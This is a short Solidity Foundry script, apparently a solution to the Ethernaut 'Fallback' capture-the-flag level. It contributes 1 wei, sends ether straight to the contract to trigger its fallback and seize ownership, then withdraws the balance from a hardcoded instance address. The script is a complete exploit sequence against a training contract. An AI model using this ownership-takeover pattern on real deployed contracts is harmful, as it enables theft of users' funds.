// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "../instances/IFallback.sol";
import "forge-std/Test.sol";

contract Attacker is Test {
    Fallback level1 = Fallback(payable(0x9D254C4F918d45B90207416603844275F448E59c));

    function test() external{
        vm.startBroadcast();

        level1.contribute{value: 1 wei}();
        level1.getContribution();
        address(level1).call{value: 1 wei}("");
        level1.owner();
        level1.withdraw();

        vm.stopBroadcast();
    }

}
